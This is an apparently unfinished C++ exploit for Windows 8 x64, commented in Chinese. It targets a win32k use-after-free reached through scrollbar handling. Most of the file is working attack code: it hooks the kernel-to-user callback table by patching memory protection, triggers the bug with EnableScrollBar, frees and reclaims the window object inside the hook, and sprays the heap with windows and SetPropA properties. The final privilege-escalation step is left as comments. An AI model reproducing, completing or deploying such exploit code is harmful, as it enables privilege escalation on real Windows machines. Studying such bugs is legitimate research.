/***********************************************************
* 重新写过 这次注释好好写
* 针对windows 8 X64.
*/

#include <Windows.h>
#include <iostream>
#include "native.h"
#include "kernelLeaks.h"

// 常量定义
HWND hwndVul = NULL;	// 漏洞关联的窗口
BOOL hookedFlag = FALSE; //Hook执行的标志位.
BOOL hookedCount = 0;	// 判断哪一次hook是我们需要的
int  hitTargetCount = 1;
typedef VOID(WINAPI * fct_clLoadLib)(VOID *);	// 回调函数的函数指针

#define fengshuiNum 0x2000	// 获取平坦的堆
#define fengshuiFakeNum 0x1500
HWND hwndFengshui[fengshuiNum];

// 钩子的相关定义
ULONG_PTR functionNameAddr;
fct_clLoadLib _ClientLoadLibrary;

// 触发漏洞
VOID triggerUAF();
VOID realTriggerUAF();

// 安装回调和卸载回调. 回调的准确性可以通过调试来验证
VOID setHookedFunc();
VOID unSetHookedFunc();

VOID fakeHookedFuncName();	// 钩子函数 这里释放和填充数据 实现利用.
VOID heapFengshui();	// 堆风水 以便于我们能够利用相连的数据进行任意读写

VOID initWindow(HWND * hwndCreate, int hwndNum);
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

// 采用内核泄露技术 方便调试

int main()
{
	// 前置工作 内核泄露的相关准备
	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		printf("Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}

	// 首先触发UAF
	std::cout << "[+] Trigger UAF" << std::endl;
	triggerUAF();
	__debugbreak();
	// 修改数据
	// 提权
	return 0;
}

/* 用于触发UAF*/
VOID realTriggerUAF()
{
	// 创建一个触发漏洞函数的窗口对象.
	// 此处代码来自NCCgroup的文章
	std::cout << "[+] to the function which we need trigger" << std::endl;
	hwndVul = CreateWindowExA(0, "SCROLLBAR", NULL, SBS_HORZ | WS_HSCROLL | WS_VSCROLL, 10, 10, 100, 100, HWND(NULL), HMENU(NULL), NULL, NULL);
	
	// 填充触发的条件
	ShowWindow(hwndVul, SW_SHOW);
	UpdateWindow(hwndVul);

	// 设置Hook 函数的标志位
	hookedFlag = TRUE;

	// 触发 
	// 此处设置断点调试需要勾取的函数
	__debugbreak();
	EnableScrollBar(hwndVul, SB_CTL | SB_BOTH, ESB_DISABLE_BOTH);

}

// 设置钩子 以及触发
VOID triggerUAF()
{
	// 先设置好钩子
	setHookedFunc();

	// 设置堆风水

	// 触发
	realTriggerUAF();

	// 卸载钩子
	unSetHookedFunc();
}

// 设置钩子 -- 这部分代码参考了前辈的代码
VOID setHookedFunc()
{
	// set hooked
	std::cout << "[+] set hooked to xxx function" << std::endl;

	// 获取存放函数地址的地方
	__debugbreak();
	functionNameAddr = _getClientFuncPtrAddr();
	_ClientLoadLibrary = (fct_clLoadLib)*(ULONG_PTR *)functionNameAddr;
	
	DWORD dwOldProtect;

	if (!VirtualProtect((LPVOID)functionNameAddr, 0x1000, PAGE_READWRITE, &dwOldProtect))
		return;

	// 设置钩子
	*(ULONG_PTR *)functionNameAddr = (ULONG_PTR)fakeHookedFuncName;

	if (!VirtualProtect((LPVOID)functionNameAddr, 0x1000, dwOldProtect, &dwOldProtect))
		return;
}

// 卸载钩子 这部分的代码参考了前辈的代码
VOID unSetHookedFunc()
{
	;
}

// 这里的钩子用来释放对象和重新填充对象 以便于漏洞的利用
VOID fakeHookedFuncName()
{
	CHAR Buf[0x1000];
	memset(Buf, 0, sizeof(Buf));
	// 首先判断是不是我们需要的hook
	if (hookedFlag == TRUE)
	{

		// 判断是不是需要的hook计数
		// 这个地方通过调试来计算hit值
		if (hookedCount == hitTargetCount)
		{
			hookedFlag = FALSE;	// 除了这一次其他都必须是正常的流程
			// 调试窗口对象 确定我们的利用思路.
			PTHRDESKHEAD targetWindow= (PTHRDESKHEAD)pHmValidateHandle(hwndVul, 1);
			__debugbreak();

			// 释放对象
			DestroyWindow(hwndVul);

			// 在风水布局的前提下填充对象 以便于利用
			
				SetPropA(hwndVul, (LPCSTR)0x8, HANDLE(0xAABBAABBAABBAABB));
		}
		hookedCount++;
	}
	_ClientLoadLibrary(Buf);
}

// 首先确定我们想要的风水布局 
VOID heapFengshui()
{
	// 在那之前我们确认一下风水布局的思路.
	// [+] 分配大量的窗口
	// [+] 分配大量的propA	-- 运用propA来进行风水布局
	// [+] 每隔1释放一个我们的wnd对象
	// [+] 分配窗口对象来填充propA的平坦布局
	// [+] 填充小的窗口来填充propListA

	for (int i = 0; i < fengshuiNum ; i++)
	{
		// 创建窗口.
		initWindow(hwndFengshui, fengshuiNum);
	}

	// 为每一个窗口释放足够多的prop. 使堆区域得到稳定的利用.
	for (int i = 0; i < fengshuiNum; i++)
	{
		if(hwndFengshui[i] != NULL) 
			for  (int j = 1; j <= 10; j++)
			{
				SetPropA(hwndFengshui [i], LPCSTR(j), HANDLE(0xAAAAAAAABBBBBBBB));
			}
	}

	// 如果你读到了此处的代码 发现这里好像重复了
	// 请注意i的值 此处是为了避免堆块合并

	// 释放部分堆块 使堆区充满空隙.
	for (int i = 0; i < fengshuiNum; i += 2)
		if (hwndFengshui[i] != NULL) DestroyWindow(hwndFengshui[i]);

	// 先填充大量的tagWND
	for (int i = 0; i < fengshuiNum; i++)
		initWindow(hwndFengshui, fengshuiFakeNum );

	// 填充tagPropList结构.
	for (int i = 1; i < fengshuiNum; i += 2)	// 填充另外一个面
		if (hwndFengshui[i] != NULL) DestroyWindow(hwndFengshui[i]);

	// 释放部分堆块 使堆区充满空隙.
	for (int i = 0; i < fengshuiNum; i++)
		initWindow(hwndFengshui, fengshuiFakeNum);		

	// 代码执行到这里的时候 已经是我们想要的风水大概布局
	// 后面的代码使用setWindowTextA来进行相关的风水布局.
	// 需要单独开一个setWindowTextA来理解...
}

/***********************************
参数:
	HWND hwndCreate: 窗口对象的句柄数组
	hwndNum: 创建多少个
*/
VOID initWindow(HWND * hwndCreate, int hwndNum)
{
	WNDCLASSEXA wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = GetModuleHandle(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = "pwnWindow";
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassExA(&wc))	// 注册窗口
	{
		std::cout << "registerWindow failed!!!" << std::endl;
		if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
			return ;
	}
	for (int i = 0; i < hwndNum; i++)	
		hwndCreate[i] =  CreateWindowExA(0, "pwnWindow", 0, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, (HWND)NULL, (HMENU)NULL, NULL,(PVOID)NULL);
}


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}

	return 0;
}
